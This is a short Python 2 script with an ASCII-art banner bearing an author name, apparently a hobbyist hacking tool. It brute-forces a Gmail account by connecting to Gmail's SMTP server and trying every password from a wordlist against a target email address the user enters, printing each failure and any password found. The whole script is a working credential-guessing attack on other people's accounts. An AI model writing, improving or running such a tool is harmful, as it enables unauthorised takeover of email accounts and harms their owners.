print ("__   _       ___   _____   _____   _____         _____   _           ___  ___       ___   _____    _____   __   _  __    __") 
print ("|  \ | |     /   | |  _  \ | ____| |  _  \       | ____| | |         /   |/   |     /   | |  _  \  |  _  \ |  \ | | \ \  / / ")
print ("|   \| |    / /| | | | | | | |__   | |_| |       | |__   | |        / /|   /| |    / /| | | |_| |  | | | | |   \| |  \ \/ /  ")
print ("| |\   |   / / | | | | | | |  __|  |  _  /       |  __|  | |       / / |__/ | |   / / | | |  _  /  | | | | | |\   |   \  /   ")
print ("| | \  |  / /  | | | |_| | | |___  | | \ \       | |___  | |___   / /       | |  / /  | | | | \ \  | |_| | | | \  |   / /    ")
print ("|_|  \_| /_/   |_| |_____/ |_____| |_|  \_\      |_____| |_____| /_/        |_| /_/   |_| |_|  \_\ |_____/ |_|  \_|  /_/     ")
print (">>>>>>>>Nader-Elmardny><<<<<<<<<<")
import  smtplib

smtpserver = smtplib.SMTP("smtp.gmail.com", 587 )
smtpserver .ehlo()
smtpserver .starttls()

user = raw_input ("Enter the target's email : ")
passwfile = raw_input("Enter the password file : ")
passwfile = open(passwfile, "r")

for password in passwfile :
        try :
                smtpserver.login(user, password)
                print ("[+] password Found ==> %s") % password
                break;
        except smtplib.SMTPAuthenticationError:
                print ("[!] password is incorrect ==> %s ") % password
